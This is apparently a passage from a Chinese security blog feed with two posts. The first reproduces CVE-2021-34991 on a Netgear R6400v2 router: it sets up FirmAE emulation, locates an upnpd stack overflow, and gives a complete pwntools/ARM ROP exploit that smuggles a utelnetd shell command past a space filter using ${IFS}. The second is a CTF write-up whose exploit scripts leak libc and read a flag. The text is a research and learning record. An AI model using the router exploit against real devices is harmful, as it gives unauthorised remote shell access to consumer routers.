<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install FirmAE</span></span><br><span class="line">git clone --recursive https://github.com/pr0v3rbs/FirmAE</span><br><span class="line">cd FirmAE &amp;&amp; ./download.sh</span><br><span class="line">./install.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use FirmAE</span></span><br><span class="line">sudo ./init.sh</span><br><span class="line"></span><br><span class="line">sudo ./run.sh -c &lt;brand&gt; &lt;firmware&gt;		# 检查模式</span><br><span class="line">sudo ./run.sh -a &lt;brand&gt; &lt;firmware&gt;		# 分析模式</span><br><span class="line">sudo ./run.sh -r &lt;brand&gt; &lt;firmware&gt;		# 运行模式</span><br><span class="line">sudo ./run.sh -d &lt;brand&gt; &lt;firmware&gt;		# 调试模式</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230129213158558.png" alt="image-20230129213158558"></p>
<p>工具搭建和使用常出现的一些问题</p>
<ul>
<li>使用<code>download.sh</code>脚本下载二进制文件时网络尝尝不通，由于项目是在github上所以有时会下载错误。最好的解决办法是一个一个下载，然后把下载的注释掉，这样就不会漏文件。如果是将下好的文件拖到虚拟机里面，会产生文件权限的更改，不过问题不大。</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>此次选用的固件是<code>R6400v2-V1.0.4.118</code>，在取消订阅的过程中，检查uuid头的函数产生了栈溢出，使得我们可以控制上下文。</p>
<p>关于upnpd的一些基础知识可以查看<a href="https://juejin.cn/post/7053763532025757732">iOS-DLNA(UPnP-GENA) - 掘金 (juejin.cn)</a>，这将有助于我们构造数据包。</p>
<h3 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3><p>请教了Dock Tree师傅，找到了漏洞存在的位置是在<code>gena_response_unsubscribe</code>附近。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211115140685.png" alt="image-20230211115140685"></p>
<p>进入<code>find_token_get_val</code>函数就可以看到溢出点</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211115256025.png" alt="image-20230211115256025"></p>
<p>可以发现传入<code>find_token_get_val</code>函数的第四个参数vul的缓冲区大小是104，而实际上在<code>find_token_get_val</code>函数中可以向这个缓冲区写入的大小是0x400，产生溢出。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>选择了FirmAE工具进行环境的搭建和调试，直接使用<code>-d</code>模式</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211175555900.png" alt="image-20230211175555900"></p>
<p>可以看到路由器的地址为<code>192.168.1.1</code>，扫一下这个IP，可以发现upnp服务开在了5000端口</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211175719510.png" alt="image-20230211175719510"></p>
<p>关于如何调试。如果直接选择选项4<code>run gdbserver</code>，那么很有可能会找不到upnpd所在的进程，所以我们需要先在选项2<code>connect to shell</code>的交互终端中找到upnpd的进程，再进行gdb的附着才能成功，如下</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211180030052.png" alt="image-20230211180030052"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211180053277.png" alt="image-20230211180053277"></p>
<p>这里写了一个调试的脚本便于操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch -q \</span><br><span class="line">	-ex &quot;set architecture arm&quot; \</span><br><span class="line">	-ex &quot;target remote 192.168.1.1:1337&quot;</span><br></pre></td></tr></table></figure>



<h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>首先我们需要知道发送数据包的格式，这里也只有慢慢逆和慢慢调了。那么我们必须要知道函数的调用链，IDA里面提供了一个方便的功能，能够帮助我们寻找函数链，如下所示</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211195614242.png" alt="image-20230211195614242"></p>
<p>这里作者对函数做了一个注释，原本是去除符号的</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211195637748.png" alt="image-20230211195637748"></p>
<p>我们找到真正开始处理我们数据包的函数位于地址<code>0x0001B0F4</code>处</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230211195200593.png" alt="image-20230211195200593"></p>
<p>最后，本人逆出来的数据包格式如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pld = <span class="string">&#x27;&#x27;&#x27;UNSUBSCRIBE Public_UPNP_Event_1 HTTP/1.1\r\nSID:\r\nHOST:\r\nUUID:&#x27;&#x27;&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2c4c</span> - <span class="number">0x2c08</span>)</span><br><span class="line">pld += <span class="string">b&#x27;deadbeef\r\n&#x27;</span>			<span class="comment"># overflow</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230306202635480.png" alt="image-20230306202635480"></p>
<p>接下来需要寻找ARM的gadget，这里做一个ARM PWN的简单了解。</p>
<p>ARM架构下，函数参数的前四个分别保存在<code>r0 ~ r3</code>当中，之后的寄存器会依次压入栈中，所以我们通过栈溢出就可以控制后面的一些寄存器。除此以外，ARM的PC寄存器保存了下一条指令的地址，<code>B</code>和<code>BL</code>指令实现了跳转。</p>
<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="img"></p>
<p>期望从路由器上反弹一个shell给我们，那么我们需要做到一下两点</p>
<ul>
<li><p>首先将<code>/bin/utelnetd -p 1234 -l /bin/sh -d</code>写入到全局变量中</p>
<p>这里是用POST的方法进行了写入，在<code>sub_1E608</code>函数中我们发现程序将部分数据存到了<code>byte_66AD0</code>全局变量中</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230307205927663.png" alt="image-20230307205927663"></p>
<p>还需要注意一个空格过滤的问题，这里会将输入数据的空格过滤掉，那么我们可以用<code>$&#123;IFS&#125;</code>来替代空格，实现的效果一样</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230307205621395.png" alt="image-20230307205621395"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230307210214650.png" alt="image-20230307210214650"></p>
<p>相关的逆向工作也是一个难点，最后数据包如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_commend</span>():</span><br><span class="line">	pld = <span class="string">b&#x27;POST Public_UPNP_C1 HTTP/1.1\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;Host: http://192.168.1.1:5000\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;SOAPACTION\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;Content-Length: 200\r\n\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;?xml version=&quot;1.0&quot;?&gt; &#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;SOAP-ENV:Envelope&gt; &#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;Body&gt;:&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;/bin/utelnetd$&#123;IFS&#125;-p$&#123;IFS&#125;1234$&#123;IFS&#125;-l$&#123;IFS&#125;/bin/sh$&#123;IFS&#125;-d&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;/SOAP-ENV:Body&gt; &#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;/SOAP-ENV:Envelope&gt;&#x27;</span></span><br><span class="line">	sh.send(pld)</span><br></pre></td></tr></table></figure>


</li>
<li><p>控制程序流执行<code>system(&quot;/bin/utelnetd -p 1234 -l /bin/sh -d&quot;)</code>在路由器的1234端口上开启监听</p>
<p>这里我们将用到一些神奇的gadget，附上一张大佬提供的图片</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230307210644839.png" alt="image-20230307210644839"></p>
<p>由于存在<code>\x00</code>截断的问题，所以用<code>\r\n</code>代替<code>\x00</code>也最多写一个gadget到栈上，况且在当前函数也会将我们的输入全部变成小写。那么就需要使用到<code>stack_add_gadget</code>来让我们栈迁移到父函数的栈帧上。</p>
</li>
</ul>
<p>最后EXP如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_commend</span>():</span><br><span class="line">	pld = <span class="string">b&#x27;POST Public_UPNP_C1 HTTP/1.1\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;Host: http://192.168.1.1:5000\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;SOAPACTION\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;Content-Length: 200\r\n\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;?xml version=&quot;1.0&quot;?&gt; &#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;SOAP-ENV:Envelope&gt; &#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;Body&gt;:&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;/bin/utelnetd$&#123;IFS&#125;-p$&#123;IFS&#125;1234$&#123;IFS&#125;-l$&#123;IFS&#125;/bin/sh$&#123;IFS&#125;-d&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;/SOAP-ENV:Body&gt; &#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;&lt;/SOAP-ENV:Envelope&gt;&#x27;</span></span><br><span class="line">	sh.send(pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	stack_add_gadget = <span class="number">0x00021F34</span>		<span class="comment"># ADD SP, 0x1000; POP &#123;R4-R7,PC&#125;                </span></span><br><span class="line">	system_gadget = <span class="number">0x00018150</span>		<span class="comment"># mov r0, r4; bl system;</span></span><br><span class="line">	commend_addr = <span class="number">0x66ad0</span></span><br><span class="line"></span><br><span class="line">	pld = <span class="string">b&#x27;UNSUBSCRIBE Public_UPNP_Event_1 HTTP/1.1\r\nSID:\r\nHOST:\r\nUUID:&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2c4c</span> - <span class="number">0x2c08</span>)</span><br><span class="line">	pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> </span><br><span class="line">	pld += <span class="string">b&#x27;\x34\x1f\x02\r\n\r\n&#x27;</span></span><br><span class="line">	pld += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x518</span> - <span class="built_in">len</span>(pld))</span><br><span class="line">	pld += p32(commend_addr)	<span class="comment"># r4</span></span><br><span class="line">	pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span></span><br><span class="line">	pld += p32(system_gadget)	<span class="comment"># pc</span></span><br><span class="line">	sh.send(pld)</span><br><span class="line"></span><br><span class="line">set_commend()</span><br><span class="line">get_shell()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<blockquote>
<p>参考文章</p>
<p><a href="https://nosec.org/home/detail/4634.html">Tenda漏洞环境搭建与复现（CVE-2020-10987）|NOSEC安全讯息平台 - 白帽汇安全研究院</a></p>
<p><a href="https://blog.csdn.net/jasonactions/article/details/118931633?ops_request_misc=%7B%22request_id%22:%22167479696216800184168758%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167479696216800184168758&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-118931633-null-null.142%5Ev71%5Epc_new_rank,201%5Ev4%5Eadd_ask&utm_term=qemu%E5%AE%9E%E7%8E%B0%E5%AE%BF%E4%B8%BB%E6%9C%BA%E5%92%8C%E5%AE%A2%E6%88%B7%E6%9C%BA%E9%80%9A%E4%BF%A1&spm=1018.2226.3001.4187">(9条消息) qemu与宿主机网络通信配置_HZero.chen的博客-CSDN博客_qemu 与宿主机通信</a></p>
<p><a href="https://www.codenong.com/49982580/">关于路由器：qemu-system-arm chroot非法指令 | 码农家园 (codenong.com)</a></p>
<p><a href="https://github.com/grimm-co/NotQuite0DayFriday/tree/trunk/2021.11.16-netgear-upnp">NotQuite0DayFriday&#x2F;2021.11.16-netgear-upnp</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/arm/rop/">Arm ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://toleleyjl.github.io/2023/02/16/CVE-2021-34991%E5%A4%8D%E7%8E%B0/">CVE-2021-34991 复现记录 (toleleyjl.github.io)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Iot</category>
      </categories>
      <tags>
        <tag>CVE-2021-34991</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 西湖论剑</title>
    <url>/2023/02/07/CTF/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><p>简单的一道栈题，利用格式化字符串泄露栈地址，再覆盖rbp迁移到我们构造的rop上。</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn_name&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;please leave your name:&quot;</span>, <span class="string">b&#x27;%20$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000401413</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004012e1</span></span><br><span class="line">csu1 = <span class="number">0x000000000040140A</span></span><br><span class="line">csu2 = <span class="number">0x00000000004013F0</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pld = p64(p_rdi_r) + p64(puts_got)</span><br><span class="line">pld += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">pld += p64(csu1)</span><br><span class="line">pld += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">pld += p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(<span class="number">0x404600</span>)</span><br><span class="line">pld += p64(<span class="number">0x100</span>)</span><br><span class="line">pld += p64(read_got)</span><br><span class="line">pld += p64(csu2)</span><br><span class="line">pld += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(<span class="number">0x404600</span> - <span class="number">8</span>)</span><br><span class="line">pld += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">pld += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">pld = pld.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pld += p64(leak_stack - <span class="number">0xd8</span>)</span><br><span class="line">pld += p64(leave_ret)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *0x00000000004013F0&#x27;)</span></span><br><span class="line">sa(<span class="string">&quot;something to DASCTF:&quot;</span>, pld)</span><br><span class="line"></span><br><span class="line">libc_base = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line">orw = p64(p_rdi_r) + p64(<span class="number">0x404600</span> + <span class="number">0x88</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0x404800</span>)</span><br><span class="line">orw += p64(p_rdx_r) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0x404800</span>)</span><br><span class="line">orw += p64(libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">orw += <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">s(orw)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p>该题存在两个漏洞点。一个是存在off-by-null，使得我们可以修改rbp的低位一个字节为<code>0x00</code>；另一个漏洞是数组溢出，使得我们可以控制循环中i的值，也就可以越界读写。</p>
<p>注意两个问题。一个是由于栈地址是随机的，所以我们需要用<code>ret</code>滑到我们需要的rop上去；另一个是关于解方程的问题，如何绕过if判断使程序ret，需要我们输入十六个正确的整数。</p>
<p>不妨在IDA中修改变量v3为数组，这样方便我们查看。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400789</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v0; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3[<span class="number">16</span>]; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number-%d:&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    buf[(<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    v0 = strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v3[i] = v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3[<span class="number">2</span>] * v3[<span class="number">1</span>] * v3[<span class="number">0</span>] - v3[<span class="number">3</span>] != <span class="number">36182</span></span><br><span class="line">    || v3[<span class="number">0</span>] != <span class="number">19</span></span><br><span class="line">    || v3[<span class="number">2</span>] * <span class="number">19</span> * v3[<span class="number">1</span>] + v3[<span class="number">3</span>] != <span class="number">36322</span></span><br><span class="line">    || (v3[<span class="number">10</span>] + v3[<span class="number">0</span>] - v3[<span class="number">5</span>]) * v3[<span class="number">13</span>] != <span class="number">32835</span></span><br><span class="line">    || (v3[<span class="number">1</span>] * v3[<span class="number">0</span>] - v3[<span class="number">2</span>]) * v3[<span class="number">3</span>] != <span class="number">44170</span></span><br><span class="line">    || (v3[<span class="number">2</span>] + v3[<span class="number">1</span>] * v3[<span class="number">0</span>]) * v3[<span class="number">3</span>] != <span class="number">51590</span></span><br><span class="line">    || v3[<span class="number">6</span>] * v3[<span class="number">5</span>] * v3[<span class="number">4</span>] - v3[<span class="number">7</span>] != <span class="number">61549</span></span><br><span class="line">    || v3[<span class="number">7</span>] * v3[<span class="number">12</span>] + v3[<span class="number">1</span>] + v3[<span class="number">15</span>] != <span class="number">19037</span></span><br><span class="line">    || v3[<span class="number">6</span>] * v3[<span class="number">5</span>] * v3[<span class="number">4</span>] + v3[<span class="number">7</span>] != <span class="number">61871</span></span><br><span class="line">    || (v3[<span class="number">5</span>] * v3[<span class="number">4</span>] - v3[<span class="number">6</span>]) * v3[<span class="number">7</span>] != <span class="number">581693</span></span><br><span class="line">    || v3[<span class="number">8</span>] != <span class="number">50</span></span><br><span class="line">    || (v3[<span class="number">6</span>] + v3[<span class="number">5</span>] * v3[<span class="number">4</span>]) * v3[<span class="number">7</span>] != <span class="number">587167</span></span><br><span class="line">    || v3[<span class="number">10</span>] * v3[<span class="number">9</span>] * v3[<span class="number">8</span>] - v3[<span class="number">11</span>] != <span class="number">1388499</span></span><br><span class="line">    || v3[<span class="number">10</span>] * v3[<span class="number">9</span>] * v3[<span class="number">8</span>] + v3[<span class="number">11</span>] != <span class="number">1388701</span></span><br><span class="line">    || (v3[<span class="number">9</span>] * v3[<span class="number">8</span>] - v3[<span class="number">10</span>]) * v3[<span class="number">11</span>] != <span class="number">640138</span></span><br><span class="line">    || (v3[<span class="number">8</span>] * v3[<span class="number">2</span>] - v3[<span class="number">13</span>]) * v3[<span class="number">9</span>] != <span class="number">321081</span></span><br><span class="line">    || (v3[<span class="number">10</span>] + v3[<span class="number">9</span>] * v3[<span class="number">8</span>]) * v3[<span class="number">11</span>] != <span class="number">682962</span></span><br><span class="line">    || v3[<span class="number">14</span>] * v3[<span class="number">13</span>] * v3[<span class="number">12</span>] - v3[<span class="number">15</span>] != <span class="number">563565</span></span><br><span class="line">    || v3[<span class="number">14</span>] * v3[<span class="number">13</span>] * v3[<span class="number">12</span>] + v3[<span class="number">15</span>] != <span class="number">563571</span></span><br><span class="line">    || v3[<span class="number">11</span>] != <span class="number">101</span></span><br><span class="line">    || (v3[<span class="number">13</span>] * v3[<span class="number">12</span>] - v3[<span class="number">14</span>]) * v3[<span class="number">15</span>] != <span class="number">70374</span></span><br><span class="line">    || (v3[<span class="number">14</span>] + v3[<span class="number">13</span>] * v3[<span class="number">12</span>]) * v3[<span class="number">15</span>] != <span class="number">70518</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;good done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>网上找了一下解方程的方法，用到的是python的<code>sympy</code>库，解题脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x0 = Symbol(<span class="string">&#x27;x0&#x27;</span>)</span><br><span class="line">x1 = Symbol(<span class="string">&#x27;x1&#x27;</span>)</span><br><span class="line">x2 = Symbol(<span class="string">&#x27;x2&#x27;</span>)</span><br><span class="line">x3 = Symbol(<span class="string">&#x27;x3&#x27;</span>)</span><br><span class="line">x4 = Symbol(<span class="string">&#x27;x4&#x27;</span>)</span><br><span class="line">x5 = Symbol(<span class="string">&#x27;x5&#x27;</span>)</span><br><span class="line">x6 = Symbol(<span class="string">&#x27;x6&#x27;</span>)</span><br><span class="line">x7 = Symbol(<span class="string">&#x27;x7&#x27;</span>)</span><br><span class="line">x8 = Symbol(<span class="string">&#x27;x8&#x27;</span>)</span><br><span class="line">x9 = Symbol(<span class="string">&#x27;x9&#x27;</span>)</span><br><span class="line">x10 = Symbol(<span class="string">&#x27;x10&#x27;</span>)</span><br><span class="line">x11 = Symbol(<span class="string">&#x27;x11&#x27;</span>)</span><br><span class="line">x12 = Symbol(<span class="string">&#x27;x12&#x27;</span>)</span><br><span class="line">x13 = Symbol(<span class="string">&#x27;x13&#x27;</span>)</span><br><span class="line">x14 = Symbol(<span class="string">&#x27;x14&#x27;</span>)</span><br><span class="line">x15 = Symbol(<span class="string">&#x27;x15&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f1 = x2 * x1 * x0 - x3 - <span class="number">36182</span></span><br><span class="line">f2 = x0 - <span class="number">19</span></span><br><span class="line">f3 = x2 * <span class="number">19</span> * x1 + x3 - <span class="number">36322</span></span><br><span class="line">f4 = (x10 + x0 - x5) * x13 - <span class="number">32835</span></span><br><span class="line">f5 = (x1 * x0 - x2) * x3 - <span class="number">44170</span></span><br><span class="line">f6 = (x2 + x1 * x0) * x3 - <span class="number">51590</span></span><br><span class="line">f7 = x6 * x5 * x4 - x7 - <span class="number">61549</span></span><br><span class="line">f8 = x7 * x12 + x1 + x15 - <span class="number">19037</span></span><br><span class="line">f9 = x6 * x5 * x4 + x7 - <span class="number">61871</span></span><br><span class="line">f10 = (x5 * x4 - x6) * x7 - <span class="number">581693</span></span><br><span class="line">f11 = x8 - <span class="number">50</span></span><br><span class="line">f12 = (x6 + x5 * x4) * x7 - <span class="number">587167</span></span><br><span class="line">f13 = x10 * x9 * x8 - x11 - <span class="number">1388499</span></span><br><span class="line">f14 = x10 * x9 * x8 + x11 - <span class="number">1388701</span></span><br><span class="line">f15 = (x9 * x8 - x10) * x11 - <span class="number">640138</span></span><br><span class="line">f16 = (x8 * x2 - x13) * x9 - <span class="number">321081</span></span><br><span class="line">f17 = (x10 + x9 * x8) * x11 - <span class="number">682962</span></span><br><span class="line">f18 = x14 * x13 * x12 - x15 - <span class="number">563565</span></span><br><span class="line">f19 = x14 * x13 * x12 + x15 - <span class="number">563571</span></span><br><span class="line">f20 = x11 - <span class="number">101</span></span><br><span class="line">f21 = (x13 * x12 - x14) * x15 - <span class="number">70374</span></span><br><span class="line">f22 = (x14 + x13 * x12) * x15 - <span class="number">70518</span></span><br><span class="line"></span><br><span class="line">rs = solve([f1, f2, f3, f4, f5, f6, f7, f8, f9, f10, f11, f12, f13, f14, f15, f16, f17, f18, f19, f20, f21, f22], </span><br><span class="line">	[x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15])</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line"><span class="comment"># [(19, 36, 53, 70, 55, 66, 17, 161, 50, 131, 212, 101, 118, 199, 24, 